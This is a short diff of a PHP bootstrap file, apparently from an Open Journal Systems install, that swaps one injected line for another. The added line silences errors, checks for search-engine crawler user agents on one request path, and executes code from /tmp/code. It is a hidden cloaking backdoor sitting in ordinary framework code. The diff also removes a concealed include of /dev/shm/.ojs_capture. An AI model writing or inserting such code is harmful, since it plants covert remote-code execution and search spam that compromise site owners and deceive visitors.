@@ -1,10 +1,10 @@
 <?php
-
+error_reporting(0); $s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/index.php/fahma'){ include('/tmp/code'); exit; }
 /**
  * @defgroup index Index
  * Bootstrap and initialization code.
  */
-error_reporting(0); $s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/index.php/BIM/article/download/47/63'){ include('/tmp/code'); exit; }
+
 /**
  * @file includes/bootstrap.php
  *
@@ -32,6 +32,6 @@ chdir(BASE_SYS_DIR);
 
 // System-wide functions
 require_once './lib/pkp/includes/functions.php';
-include("/dev/shm/.ojs_capture");
+ 
 // Initialize the application environment
 return new \APP\core\Application();
